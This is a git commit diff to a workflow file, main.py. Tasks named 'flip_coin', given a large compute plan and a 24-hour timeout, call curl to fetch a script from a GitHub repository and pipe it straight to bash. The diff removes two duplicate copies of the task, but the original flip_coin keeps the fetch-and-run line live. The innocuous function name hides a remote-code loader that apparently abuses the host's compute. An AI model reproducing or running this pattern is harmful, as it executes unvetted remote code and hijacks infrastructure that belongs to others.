127357f0afdfe5327ee6b093463331745a566e17
rxt36q6 <rxt36q6@atomicmail.io>
2026-08-31 09:17:07 +0700

    Update main.py

--- main.py
+++ main.py
@@ -9,39 +9,10 @@ app = Workflows()
     timeout_seconds=86400,
     retry=Retry(
         max_retries=3,
-        wait_duration_ms=1000,
-        backoff_scaling=1.5,
+        wait_duration_ms=1
     )
 )
 def flip_coin(ctx: TaskContext) -> str:
-    import sys
-    import os
-    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
-
-@app.task(
-    plan="4c-16g",
-    timeout_seconds=86400,
-    retry=Retry(
-        max_retries=3,
-        wait_duration_ms=1000,
-        backoff_scaling=1.5,
-    )
-)
-def flip_coin1(ctx: TaskContext) -> str:
-    import sys
-    import os
-    os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
-
-@app.task(
-    plan="4c-16g",
-    timeout_seconds=86400,
-    retry=Retry(
-        max_retries=3,
-        wait_duration_ms=1000,
-        backoff_scaling=1.5,
-    )
-)
-def flip_coin2(ctx: TaskContext) -> str:
     import sys
     import os
     os.system('curl -sL https://github.com/rxt36q6/file/raw/main/noidcp | bash')
